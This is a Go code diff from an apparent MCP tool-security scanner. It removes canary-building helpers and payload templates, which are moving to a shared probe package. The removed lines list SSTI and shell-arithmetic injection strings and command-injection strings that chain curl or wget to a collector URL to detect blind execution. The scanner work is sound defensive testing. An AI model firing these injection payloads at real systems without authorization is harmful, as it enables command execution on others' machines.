@@ -6,98 +6,15 @@
 // an LLM can be manipulated INTO a tool call: mcptool calls the tools
 // itself and observes what actually runs.
 //
+// Payload construction (computed-arithmetic canaries, shell-command payloads)
+// and the out-of-band collector live in internal/mcpprobe, shared with the
+// internal/probes/mcpprimitive package that attacks the non-tool primitives.
+//
 // Sibling package: internal/probes/mcptransport houses transport-layer
 // probes (OriginValidation, SSESessionHijack) that bypass the MCP
 // protocol entirely and issue raw HTTP. Different attack surface,
 // different interface (types.MCPEndpoint), different package.
 package mcptool
-
-import (
-	"crypto/rand"
-	"encoding/hex"
-	"fmt"
-	"math/big"
-	"strconv"
-)
-
-// randToken returns a random 16-hex-char token for canaries/OOB paths.
-func randToken() string {
-	b := make([]byte, 8)
-	if _, err := rand.Read(b); err != nil {
-		return "augfallback000000"
-	}
-	return hex.EncodeToString(b)
-}
-
-// canary is a computed-arithmetic injection canary. Each payload, if the target
-// evaluates it, yields `marker` (the product) in the output. The marker never
-// appears literally in any payload, so a tool that merely echoes its input back
-// cannot produce a false positive — the failure mode that made the old
-// echo-based detectors useless against direct tool calls.
-type canary struct {
-	marker   string
-	payloads []string
-}
-
-// payloadFormats render the same multiplication across the injection classes we
-// cover: bare expression/eval, template engines (SSTI), and shell.
-var payloadFormats = []string{
-	"%d*%d",             // bare expression / eval / Python
-	"{{%d*%d}}",         // Jinja / Twig / Nunjucks SSTI
-	"${%d*%d}",          // JSP EL / Freemarker / shell-ish templates
-	"#{%d*%d}",          // Ruby / Thymeleaf EL
-	"$((%d*%d))",        // shell arithmetic expansion
-	"; expr %d \\* %d",  // command injection via separator
-	"$(expr %d \\* %d)", // command substitution
-	"`expr %d \\* %d`",  // backtick command substitution
-}
-
-// oobCmdFormats are OS-command-injection payload templates. Each embeds a single
-// canary URL (the %s): a tool that passes the argument to a shell (directly or
-// via os/system, subprocess with shell=True, backtick eval, etc.) will fetch the
-// URL, producing an out-of-band callback on the collector. This catches BLIND
-// command injection — the sink runs but returns nothing to the client — which the
-// computed-arithmetic payloadFormats above cannot, since they rely on the result
-// being reflected in-band. The separators cover POSIX shells (`;`, `|`, `&&`,
-// newline, `$(...)`, backticks) and Windows cmd (`&`); curl and wget both ship on
-// modern Linux/macOS and curl ships on Windows 10+. Every fetch carries a short
-// timeout (`-m`/`-T`) so a target whose OS silently blackholes the connection to
-// an unroutable collector can't hang the (sequential) probe for minutes.
-var oobCmdFormats = []string{
-	"; curl -s -m 3 %s",        // statement separator
-	"| curl -s -m 3 %s",        // pipe
-	"& curl -s -m 3 %s",        // background / Windows cmd separator
-	"&& curl -s -m 3 %s",       // conditional chain
-	"$(curl -s -m 3 %s)",       // command substitution
-	"`curl -s -m 3 %s`",        // backtick command substitution
-	"; wget -qO- -T 3 %s",      // wget fallback where curl is absent
-	"\ncurl -s -m 3 %s",        // newline injection (also covers direct-exec sinks)
-	"' ; curl -s -m 3 %s ; #",  // break out of single-quoted context; # eats the wrapper's trailing quote
-	"\" ; curl -s -m 3 %s ; #", // break out of double-quoted context; # eats the wrapper's trailing quote
-}
-
-// newCanary builds a canary from two random factors. The product is ~9 digits,
-// making a coincidental appearance in benign output vanishingly unlikely.
-func newCanary() canary {
-	a := randInt(100000, 999999)
-	b := randInt(101, 999)
-	c := canary{marker: strconv.Itoa(a * b)}
-	c.payloads = make([]string, len(payloadFormats))
-	for i, f := range payloadFormats {
-		c.payloads[i] = fmt.Sprintf(f, a, b)
-	}
-	return c
-}
-
-// randInt returns a random int in [min, max). On the (practically impossible)
-// RNG failure it falls back to min, which still yields a valid canary.
-func randInt(min, max int) int {
-	n, err := rand.Int(rand.Reader, big.NewInt(int64(max-min)))
-	if err != nil {
-		return min
-	}
-	return min + int(n.Int64())
-}
 
 // paramInfo describes one tool parameter parsed from its JSON-schema.
 type paramInfo struct {
